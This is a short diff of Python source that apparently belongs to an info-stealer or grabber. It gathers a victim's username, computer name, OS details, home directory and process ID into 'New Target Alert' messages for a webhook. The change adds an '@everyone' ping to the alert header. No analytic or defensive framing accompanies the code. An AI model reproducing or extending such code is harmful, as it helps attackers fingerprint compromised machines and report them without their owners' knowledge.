@@ -23,7 +23,7 @@ _home_directory = os.path.expanduser("~")
 _process_id = os.getpid()
 
 _webhook_lines = [
-    "[!] **New Target Alert**",
+    "[!] **New Target Alert @everyone**",
     f"[!] **User:** `{_username}`",
     f"[!] **Computer:** `{_computer_name}`",
     f"[!] **OS:** `{_os_system} {_os_release} ({_os_version})`",
